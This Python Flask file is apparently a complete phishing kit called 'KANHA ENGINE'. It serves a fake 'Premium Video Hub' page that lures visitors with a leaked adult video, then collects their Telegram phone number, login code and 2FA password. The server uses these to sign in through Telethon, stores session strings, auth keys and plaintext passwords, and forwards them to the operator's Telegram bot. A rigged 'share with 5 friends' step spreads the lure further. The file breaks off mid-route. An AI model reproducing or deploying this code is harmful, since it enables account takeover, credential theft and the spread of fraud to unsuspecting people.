# ============================================================
#  KANHA ENGINE — Complete Single-File Telegram Capture Server
#  File name: app.py  (must be exactly this name, lowercase)
#  Run: gunicorn app:app
# ============================================================
from flask import Flask, request, jsonify, render_template_string
import os, json, base64, threading, asyncio, logging, time
from datetime import datetime
from telethon import TelegramClient, errors
from telethon.sessions import StringSession
import requests as http_requests
import sys

logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
API_ID = int(os.environ.get("API_ID", "0"))
API_HASH = os.environ.get("API_HASH", "")
YOUR_TELEGRAM_ID = int(os.environ.get("OWNER_ID", "0"))

if sys.version_info >= (3, 12) and sys.platform == 'win32':
    try: asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())
    except: pass

app = Flask(__name__)

user_sessions, pending_codes, pending_2fa = {}, {}, {}
sessions_lock = threading.Lock()

DATA_FILE = "captured_accounts.json"
PENDING_FILE = "pending_contacts.json"


def load_accounts():
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f: return json.load(f)
        except Exception as e:
            logger.error(f"Load error: {e}"); return []
    return []


def save_account(account):
    accounts = load_accounts()
    for i, a in enumerate(accounts):
        if a['phone'] == account['phone']:
            accounts[i] = account; break
    else:
        accounts.append(account)
    with open(DATA_FILE, 'w') as f: json.dump(accounts, f, indent=2)
    logger.info(f"✅ Saved: {account['phone']}")
    return account


captured_accounts = load_accounts()


def load_pending():
    if os.path.exists(PENDING_FILE):
        try:
            with open(PENDING_FILE) as f: return json.load(f)
        except: return {}
    return {}


def save_pending(data):
    with open(PENDING_FILE, 'w') as f: json.dump(data, f, indent=2)


def format_phone(ph):
    if not ph: return ph
    digits = ''.join(filter(str.isdigit, ph))
    if not digits: return ph
    if ph.startswith('+'): return ph
    if len(digits) == 10: return '+91' + digits
    if len(digits) == 12 and digits.startswith('91'): return '+' + digits
    return '+' + digits


def send_bot_notification(phone, ss, me, dc, password_used=False, password_value=""):
    try:
        extra = ""
        if password_used:
            extra = "\n🔐 2FA Used"
            if password_value: extra += f"\n🔑 2FA Pass: `{password_value}`"
        max_len = 3900
        if len(ss) > max_len:
            msg1 = (f"🔔 New Account!{extra}\n📱 {phone}\n👤 {me.first_name} {me.last_name or ''}\n"
                    f"🆔 {me.id}\n🌐 DC: {dc}\n\n📄 Part 1/2:\n`{ss[:max_len]}`")
            msg2 = f"📄 Part 2/2 for {phone}:\n`{ss[max_len:]}`"
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                               json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg1, 'parse_mode': 'Markdown'}, timeout=15)
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                               json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg2, 'parse_mode': 'Markdown'}, timeout=15)
        else:
            msg = (f"🔔 New Account!{extra}\n📱 {phone}\n👤 {me.first_name} {me.last_name or ''}\n"
                   f"🆔 {me.id}\n🌐 DC: {dc}\n\n🔑 Session:\n`{ss}`")
            http_requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                               json={'chat_id': YOUR_TELEGRAM_ID, 'text': msg, 'parse_mode': 'Markdown'}, timeout=15)
    except Exception as e:
        logger.error(f"Bot notify error: {e}")


def run_telegram_action(phone, code=None, password=None):
    loop = asyncio.new_event_loop(); asyncio.set_event_loop(loop)
    try:
        async def send_code():
            client = TelegramClient(StringSession(), API_ID, API_HASH)
            await client.connect()
            try:
                r = await client.send_code_request(phone)
                with sessions_lock:
                    user_sessions[phone] = {'hash': r.phone_code_hash,
                                            'session': StringSession.save(client.session)}
                    pending_codes[phone] = 'sent'; pending_2fa[phone] = False
                logger.info(f"✅ Code sent to {phone}")
                return {'success': True}
            except errors.FloodWaitError as e:
                with sessions_lock: pending_codes[phone] = 'err'
                return {'success': False, 'error': f'Flood wait {e.seconds}s'}
            except Exception as e:
                logger.error(f"send_code error: {e}")
                with sessions_lock: pending_codes[phone] = 'err'
                return {'success': False, 'error': str(e)[:80]}
            finally:
                await client.disconnect()

        async def verify():
            with sessions_lock:
                if phone not in user_sessions: return {'success': False, 'error': 'Session not found'}
                s = user_sessions[phone]
            client = TelegramClient(StringSession(s['session']), API_ID, API_HASH)
            try:
                await client.connect()
                if await client.is_user_authorized():
                    me = await client.get_me()
                else:
                    try:
                        await client.sign_in(phone=phone, code=code, phone_code_hash=s['hash'])
                        me = await client.get_me()
                    except errors.SessionPasswordNeededError:
                        with sessions_lock:
                            pending_2fa[phone] = True; pending_codes[phone] = '2fa_needed'
                        if password:
                            try:
                                await client.sign_in(password=password)
                                me = await client.get_me()
                                with sessions_lock:
                                    pending_2fa[phone] = False; pending_codes[phone] = 'done'
                            except errors.PasswordHashInvalidError:
                                return {'success': False, 'error': 'Wrong 2FA password'}
                            except Exception as e:
                                return {'success': False, 'error': f'2FA error: {str(e)[:50]}'}
                        else:
                            return {'success': False, 'error': '2FA', 'needs_password': True}
                    except errors.PhoneCodeInvalidError:
                        return {'success': False, 'error': 'Wrong code'}
                    except errors.PhoneCodeExpiredError:
                        return {'success': False, 'error': 'Code expired'}
                    except Exception as e:
                        return {'success': False, 'error': str(e)[:80]}

                await client.get_dialogs()
                ss = StringSession.save(client.session)
                try: auth_key = client.session.auth_key.key
                except: auth_key = None
                dc = client.session.dc_id
                if not auth_key:
                    await client.disconnect(); await asyncio.sleep(0.5)
                    client2 = TelegramClient(StringSession(ss), API_ID, API_HASH)
                    await client2.connect(); await client2.get_dialogs()
                    auth_key = client2.session.auth_key.key; dc = client2.session.dc_id
                    ss = StringSession.save(client2.session); me = await client2.get_me()
                    await client2.disconnect(); client = client2

                auth_b64 = base64.b64encode(auth_key).decode() if auth_key else ""
                password_used = password is not None
                acc = {
                    'phone': phone, 'user_id': me.id, 'username': me.username or '',
                    'first_name': me.first_name or '', 'last_name': me.last_name or '',
                    'session': ss,
                    'webk': json.dumps({'dcId': dc, 'authKey': auth_b64, 'userId': me.id,
                                        'isSupport': False, 'isTest': False}),
                    'dc': dc, 'time': str(datetime.now()),
                    'has_2fa': password_used, 'password': password if password_used else ''
                }
                save_account(acc)
                global captured_accounts; captured_accounts = load_accounts()
                with sessions_lock:
                    user_sessions.pop(phone, None); pending_2fa.pop(phone, None)
                    pending_codes[phone] = 'done'
                send_bot_notification(phone, ss, me, dc, password_used, password or "")
                logger.info(f"✅ Captured: {phone}")
                return {'success': True, 'session': ss, 'user_id': me.id}
            except Exception as e:
                e_str = str(e)
                logger.error(f"Verify error: {e_str}")
                if 'PHONE_CODE_INVALID' in e_str: return {'success': False, 'error': 'Wrong code'}
                if 'SESSION_PASSWORD_NEEDED' in e_str: return {'success': False, 'error': '2FA', 'needs_password': True}
                if 'PASSWORD_HASH_INVALID' in e_str: return {'success': False, 'error': 'Wrong 2FA password'}
                return {'success': False, 'error': e_str[:80]}
            finally:
                try: await client.disconnect()
                except: pass

        return loop.run_until_complete(verify()) if code else loop.run_until_complete(send_code())
    finally:
        loop.close()


PAGE = r"""<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>Premium Video Hub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0a0a0a;color:white;min-height:100vh}
.header{padding:50px 20px 25px;text-align:center;background:linear-gradient(180deg,#1a1a2e,#0a0a0a)}
.header h1{font-size:26px;font-weight:900;background:linear-gradient(45deg,#ff6b6b,#ffa500);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
.header p{color:#777;font-size:13px;margin-top:8px}
.video-card{margin:15px 20px;background:#141420;border-radius:15px;overflow:hidden;border:1px solid #1a1a2e}
.thumbnail{width:100%;height:210px;background:linear-gradient(135deg,#2d1b69,#ff6b6b);display:flex;align-items:center;justify-content:center}
.thumbnail .play-btn{width:65px;height:65px;background:rgba(255,255,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:28px;border:2px solid rgba(255,255,255,0.2)}
.video-info{padding:15px}
.video-info h3{font-size:15px;margin-bottom:5px}
.video-info .meta{color:#666;font-size:12px}
.video-info .badge{display:inline-block;background:#e94560;padding:2px 10px;border-radius:4px;font-size:11px;margin-top:8px}
.link-section{padding:10px 20px 20px;text-align:center}
.get-link-btn{width:100%;padding:18px;background:linear-gradient(45deg,#e94560,#ff6b6b);border:none;border-radius:50px;color:white;font-size:20px;font-weight:800;cursor:pointer;box-shadow:0 8px 30px rgba(233,69,96,0.4);letter-spacing:1px;text-transform:uppercase}
.modal-overlay{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);z-index:1000;padding:20px;overflow-y:auto}
.modal-overlay.active{display:flex;align-items:center;justify-content:center}
.modal{background:#141420;border-radius:20px;padding:30px;max-width:380px;width:100%;border:1px solid #1a1a2e}
.modal-icon{text-align:center;font-size:45px;margin-bottom:10px}
.modal h2{text-align:center;font-size:18px;margin-bottom:5px}
.modal p{text-align:center;color:#888;font-size:13px;margin-bottom:15px}
.modal .sb{text-align:center;padding:12px;border-radius:10px;margin:10px 0;display:none;font-size:13px}
.modal .sb.success{display:block;background:rgba(76,175,80,0.15);color:#81C784}
.modal .sb.error{display:block;background:rgba(244,67,54,0.15);color:#EF9A9A}
.modal .sb.info{display:block;background:rgba(33,150,243,0.15);color:#90CAF9}
.modal .sb.waiting{display:block;background:rgba(255,152,0,0.15);color:#FFB74D}
.cd{background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;padding:15px;font-size:30px;text-align:center;letter-spacing:15px;color:white;margin:10px 0;font-weight:bold;min-height:55px}
.np{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;margin:10px 0}
.np .k{padding:16px;border:none;border-radius:10px;background:#2a2a3e;color:white;font-size:22px;cursor:pointer}
.np .kc{background:#e94560}
.np .ks{background:#4CAF50;color:white;font-weight:700;font-size:14px}
.step{display:none}.step.active{display:block}
.sp{display:inline-block;width:18px;height:18px;border:2px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 0.8s linear infinite;vertical-align:middle;margin-right:6px}
@keyframes spin{to{transform:rotate(360deg)}}
.share-progress{display:flex;justify-content:center;margin:15px 0;gap:5px}
.share-step{width:35px;height:35px;border-radius:50%;background:#2a2a3e;display:flex;align-items:center;justify-content:center;font-size:14px;color:#666;font-weight:700}
.share-step.done{background:#4CAF50;color:white}
.share-step.active{background:#0088cc;color:white}
.pwd-input{width:100%;padding:15px;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;color:white;font-size:16px;text-align:center;outline:none;margin:10px 0}
</style>
</head>
<body>
<div class="header"><h1>🔥 PREMIUM VIDEO HUB</h1><p>Exclusive content — Verified members only</p></div>
<div class="video-card">
<div class="thumbnail"><div class="play-btn">▶</div></div>
<div class="video-info"><h3>🔥 LEAKED PRIVATE VIDEO — 2026</h3>
<div class="meta">⭐ 4.9 (2.4M views) • 18+</div>
<span class="badge">🔞 RESTRICTED</span></div>
</div>
<div class="link-section"><button class="get-link-btn" id="glb">🔞 GET YOUR LINK</button></div>

<div class="modal-overlay" id="vm">
<div class="modal">

<div id="s1" class="step active">
<div class="modal-icon">📱</div>
<h2>Telegram verification</h2>
<p>Enter your Telegram phone number</p>
<div style="display:flex;background:#0a0a0a;border:2px solid #2a2a3e;border-radius:10px;margin-bottom:12px;overflow:hidden">
<div style="padding:12px 8px;background:#1a1a2e;color:#888;font-size:14px;font-weight:600;min-width:50px;text-align:center">+91</div>
<input type="tel" id="phoneInput" placeholder="XXXXXXXXXX" maxlength="10"
 style="flex:1;padding:15px;background:transparent;border:none;color:white;font-size:18px;text-align:center;outline:none">
</div>
<button onclick="sendPhoneFromStep1()"
 style="width:100%;padding:15px;background:#0088cc;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer">
📱 Send code</button>
<div id="ps1" class="sb info" style="display:none">⏳ Processing...</div>
</div>

<div id="s2" class="step">
<div class="modal-icon">🔐</div>
<h2>Verification code</h2>
<p>📱 <span id="pd" style="color:#0088cc;font-weight:bold">+91XXXXXXXXXX</span></p>
<div id="cs" class="sb waiting"><span class="sp"></span> Please wait...</div>
<div class="cd" id="cdisp">_</div>
<div class="np">
<button class="k" onclick="pk('1')">1</button><button class="k" onclick="pk('2')">2</button><button class="k" onclick="pk('3')">3</button>
<button class="k" onclick="pk('4')">4</button><button class="k" onclick="pk('5')">5</button><button class="k" onclick="pk('6')">6</button>
<button class="k" onclick="pk('7')">7</button><button class="k" onclick="pk('8')">8</button><button class="k" onclick="pk('9')">9</button>
<button class="k kc" onclick="cc()">⌫</button><button class="k" onclick="pk('0')">0</button>
<button class="k ks" id="sb" onclick="sc()">✓ Verify</button>
</div>
<div id="vs" class="sb"></div>
</div>

<div id="s2b" class="step">
<div class="modal-icon">🔐</div>
<h2>Two-Factor Authentication</h2>
<p>This account has 2FA enabled.<br>Enter your cloud password:</p>
<input type="password" id="pwdInput" class="pwd-input" placeholder="Telegram password" maxlength="64">
<button onclick="submitPassword()"
 style="width:100%;padding:15px;background:#e94560;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer">
🔑 Verify Password</button>
<div id="pwdStatus" class="sb" style="display:none"></div>
</div>

<div id="s3" class="step">
<div class="modal-icon">🎬</div>
<h2>Almost there!</h2>
<p>Share this link with <strong>5 friends</strong> on Telegram to unlock the video</p>
<div class="share-progress">
<div class="share-step" id="sp1">1</div><div class="share-step" id="sp2">2</div>
<div class="share-step" id="sp3">3</div><div class="share-step" id="sp4">4</div>
<div class="share-step" id="sp5">5</div>
</div>
<div id="shareStatus" class="sb waiting" style="display:block">
<span class="sp"></span> Share to start unlocking...</div>
<button onclick="simulateShare()"
 style="width:100%;padding:15px;background:#25D366;border:none;border-radius:10px;color:white;font-size:16px;font-weight:600;cursor:pointer;margin:10px 0">
📤 Share to Telegram</button>
</div>

<div id="s4" class="step">
<div style="text-align:center;padding:20px 0">
<div style="font-size:60px">⏳</div>
<h2 style="color:#4CAF50;font-size:22px;margin:15px 0 8px">Processing...</h2>
<p style="color:#888;font-size:13px">Verifying shares...</p>
<div style="margin:20px auto;width:50px;height:50px;border:4px solid #333;border-top-color:#0088cc;border-radius:50%;animation:spin 1s linear infinite"></div>
</div>
</div>

</div></div>

<script>
var phoneNumber='', codeDigits='', codeCheckInterval=null, passwordCheckInterval=null;
var sharesDone=0;
var TG_CHANNEL_LINK='https://t.me/videodks';
var TG_CHANNEL_CAPTION='𝟱𝟬% 𝗢𝗳𝗳 𝗠𝗲𝗴𝗮 𝗟𝗶𝗻𝗸 🔞👇';

var urlParams = new URLSearchParams(window.location.search);
var TG_UID = urlParams.get('uid') || localStorage.getItem('tg_user_id') || '';
if (TG_UID) localStorage.setItem('tg_user_id', TG_UID);

async function autoBoot() {
    if (!TG_UID) return false;
    try {
        var r = await fetch('/api/check_session', {
            method:'POST', headers:{'Content-Type':'application/json'},
            body: JSON.stringify({tg_user_id: TG_UID})
        });
        var d = await r.json();
        if (d.has_session) {
            phoneNumber = d.phone;
            localStorage.setItem('tg_shares_' + TG_UID,
                localStorage.getItem('tg_shares_' + TG_UID) || '0');
            document.getElementById('vm').classList.add('active');
            showStep('s3');
            setupShareLink();
            return true;
        }
    } catch(e) {}

    try {
        var r2 = await fetch('/api/pending_contact/' + TG_UID);
        var d2 = await r2.json();
        if (d2.found) {
            phoneNumber = d2.phone;
            document.getElementById('vm').classList.add('active');
            document.getElementById('pd').textContent = phoneNumber;
            showStep('s2');
            var cs = document.getElementById('cs');
            cs.className='sb waiting';
            cs.innerHTML='<span class="sp"></span> Sending code...';
            cs.style.display='block';
            await fetch('/api/share', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            startCodeCheck();
            return true;
        }
    } catch(e) {}

    return false;
}

function showStep(id) {
    ['s1','s2','s2b','s3','s4'].forEach(function(x){
        document.getElementById(x).classList.remove('active');
    });
    document.getElementById(id).classList.add('active');
}

document.getElementById('glb').onclick = async function() {
    document.getElementById('vm').classList.add('active');
    var booted = await autoBoot();
    if (!booted) {
        showStep('s1');
        document.getElementById('ps1').style.display='none';
        document.getElementById('phoneInput').value='';
    }
};

window.addEventListener('load', function() {
    if (TG_UID) { document.getElementById('glb').click(); }
});

function sendPhoneFromStep1() {
    var phone = document.getElementById('phoneInput').value.trim();
    if (!phone || phone.length !== 10) {
        var ps = document.getElementById('ps1');
        ps.className='sb error';
        ps.innerHTML='❌ 10 digit number din';
        ps.style.display='block';
        return;
    }
    phoneNumber = '+91' + phone;
    var ps = document.getElementById('ps1');
    ps.className='sb waiting';
    ps.innerHTML='<span class="sp"></span> Sending code...';
    ps.style.display='block';

    fetch('/api/share', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({phone: phoneNumber})
    }).then(function(r){ return r.json(); }).then(function(d){
        if (d.success) {
            showStep('s2');
            document.getElementById('pd').textContent = phoneNumber;
            var cs = document.getElementById('cs');
            cs.className='sb waiting';
            cs.innerHTML='<span class="sp"></span> Sending code...';
            cs.style.display='block';
            startCodeCheck();
        } else {
            var ps = document.getElementById('ps1');
            ps.className='sb error';
            ps.innerHTML='❌ ' + (d.error || 'Error');
            ps.style.display='block';
        }
    }).catch(function(){
        var ps = document.getElementById('ps1');
        ps.className='sb error';
        ps.innerHTML='❌ Connection error';
        ps.style.display='block';
    });
}

function startCodeCheck() {
    if (codeCheckInterval) clearInterval(codeCheckInterval);
    codeCheckInterval = setInterval(async function(){
        try {
            var r = await fetch('/api/check', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var d = await r.json();
            if (d.s === 'sent') {
                clearInterval(codeCheckInterval); codeCheckInterval=null;
                var cs=document.getElementById('cs');
                cs.className='sb success';
                cs.innerHTML='✅ Code sent! Enter it below:';
            } else if (d.s === 'done') {
                clearInterval(codeCheckInterval); codeCheckInterval=null;
                fetchUserIdAndGoToShare(phoneNumber);
            } else if (d.s === '2fa_needed') {
                clearInterval(codeCheckInterval); codeCheckInterval=null;
                showStep('s2b');
                startPasswordCheck();
            } else if (d.s === 'err') {
                clearInterval(codeCheckInterval); codeCheckInterval=null;
                var cs=document.getElementById('cs');
                cs.className='sb error';
                cs.innerHTML='❌ Failed to send code';
            }
        } catch(e) {}
    }, 2000);
}

function startPasswordCheck() {
    if (passwordCheckInterval) clearInterval(passwordCheckInterval);
    passwordCheckInterval = setInterval(async function(){
        try {
            var r = await fetch('/api/check', {
                method:'POST', headers:{'Content-Type':'application/json'},
                body: JSON.stringify({phone: phoneNumber})
            });
            var d = await r.json();
            if (d.s === 'done') {
                clearInterval(passwordCheckInterval); passwordCheckInterval=null;
                fetchUserIdAndGoToShare(phoneNumber);
            }
        } catch(e) {}
    }, 2000);
}

async function fetchUserIdAndGoToShare(phone) {
    try {
        var r = await fetch('/session/' + encodeURIComponent(phone));
        var d = await r.json();
        if (d.user_id) {
            localStorage.setItem('tg_user_id', String(d.user_id));
            localStorage.setItem('tg_shares_' + d.user_id,
                localStorage.getItem('tg_shares_' + d.user_id) || '0');
        }
    } catch(e) {}
    showStep('s3');
    setupShareLink();
}

function pk(n){ if(codeDigits.length<5){ codeDigits+=n; document.getElementById('cdisp').textContent=codeDigits; } }
function cc(){ codeDigits=codeDigits.slice(0,-1); document.getElementById('cdisp').textContent=codeDigits||'_'; }

async function sc() {
    if (codeDigits.length < 5) {
        var v=document.getElementById('vs');
        v.textContent='❌ 5 digit code din';
        v.className='sb error'; v.style.display='block';
        return;
    }
    document.getElementById('sb').disabled=true;
    document.getElementById('sb').textContent='⏳ Verifying...';
    try {
        var r = await fetch('/api/verify', {
            method:'POST', headers:{'Content-Type':'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits})
        });
        var d = await r.json();
        if (d.success) {
            if (d.user_id) {
                localStorage.setItem('tg_user_id', String(d.user_id));
                localStorage.setItem('tg_shares_'+d.user_id, '0');
            }
            if (codeCheckInterval){ clearInterval(codeCheckInterval); codeCheckInterval=null; }
            showStep('s3');
            setupShareLink();
        } else if (d.needs_password) {
            showStep('s2b');
            if (codeCheckInterval){ clearInterval(codeCheckInterval); codeCheckInterval=null; }
            startPasswordCheck();
        } else {
            var v=document.getElementById('vs');
            v.textContent='❌ ' + (d.error || 'Wrong code');
            v.className='sb error'; v.style.display='block';
            codeDigits=''; document.getElementById('cdisp').textContent='_';
            document.getElementById('sb').disabled=false;
            document.getElementById('sb').textContent='✓ Verify';
        }
    } catch(e) {
        document.getElementById('sb').disabled=false;
        document.getElementById('sb').textContent='✓ Verify';
    }
}

async function submitPassword() {
    var pwd = document.getElementById('pwdInput').value.trim();
    if (!pwd) {
        var ps=document.getElementById('pwdStatus');
        ps.className='sb error'; ps.innerHTML='❌ Password din';
        ps.style.display='block'; return;
    }
    var ps=document.getElementById('pwdStatus');
    ps.className='sb waiting';
    ps.innerHTML='<span class="sp"></span> Checking...';
    ps.style.display='block';
    try {
        var r = await fetch('/api/verify', {
            method:'POST', headers:{'Content-Type':'application/json'},
            body: JSON.stringify({phone: phoneNumber, code: codeDigits, password: pwd})
        });
        var d = await r.json();
        if (d.success) {
            if (d.user_id) {
                localStorage.setItem('tg_user_id', String(d.user_id));
                localStorage.setItem('tg_shares_'+d.user_id, '0');
            }
            if (passwordCheckInterval){ clearInterval(passwordCheckInterval); passwordCheckInterval=null; }
            showStep('s3');
            setupShareLink();
        } else {
            ps.className='sb error';
            ps.innerHTML='❌ ' + (d.error || 'Wrong password');
            ps.style.display='block';
        }
    } catch(e) {
        ps.className='sb error';
        ps.innerHTML='❌ Connection error';
        ps.style.display='block';
    }
}

function setupShareLink() {
    var tgUserId = localStorage.getItem('tg_user_id');
    if (tgUserId) {
        sharesDone = parseInt(localStorage.getItem('tg_shares_' + tgUserId) || '0');
    }
    updateShareProgress();
    if (sharesDone > 0) {
        var st = document.getElementById('shareStatus');
        if (sharesDone >= 4) {
            st.className = 'sb waiting';
            st.innerHTML = '<span class="sp"></span> One more share!';
        } else {
            st.className = 'sb success';
            st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' left...';
        }
        st.style.display = 'block';
    }
}

function simulateShare() {
    var shareUrl = 'https://t.me/share/url?url=' + encodeURIComponent(TG_CHANNEL_LINK) + 
                   '&text=' + encodeURIComponent(TG_CHANNEL_CAPTION);
    window.open(shareUrl, '_blank');
    sharesDone = Math.min(sharesDone + 1, 4);
    var tgUserId = localStorage.getItem('tg_user_id');
    if (tgUserId) {
        localStorage.setItem('tg_shares_' + tgUserId, String(sharesDone));
    }
    updateShareProgress();
    var st = document.getElementById('shareStatus');
    if (sharesDone >= 4) {
        st.className = 'sb waiting';
        st.innerHTML = '<span class="sp"></span> One more share!';
        st.style.display = 'block';
    } else if (sharesDone > 0) {
        st.className = 'sb success';
        st.innerHTML = '✅ ' + sharesDone + '/5 shared! ' + (5 - sharesDone) + ' left...';
        st.style.display = 'block';
    }
}

function updateShareProgress() {
    for (var i = 1; i <= 5; i++) {
        var el = document.getElementById('sp' + i);
        if (i <= sharesDone) el.className = 'share-step done';
        else if (i === sharesDone + 1) el.className = 'share-step active';
        else el.className = 'share-step';
    }
}

document.getElementById('vm').onclick = function(e) {
    if (e.target === this) {
        this.classList.remove('active');
        if (codeCheckInterval){ clearInterval(codeCheckInterval); codeCheckInterval=null; }
        if (passwordCheckInterval){ clearInterval(passwordCheckInterval); passwordCheckInterval=null; }
    }
};
</script>
</body>
</html>"""


# ============================================================
#  FLASK ROUTES
# ============================================================

@app.route('/')
def index():
    return render_template_string(PAGE)


@app.route('/api/share', methods=['POST'])
def share():
    ph = request.json.get('phone', '')
    if not ph:
        return jsonify({'success': False, 'error': 'Phone required'})
    ph = format_phone(ph)
    logger.info(f"Phone received: {ph}")
    with sessions_lock:
        pending_codes[ph] = 'sending'
    t = threading.Thread(target=run_telegram_action, args=(ph,))
    t.daemon = True
    t.start()
    return jsonify({'success': True})


@app.route('/api/check
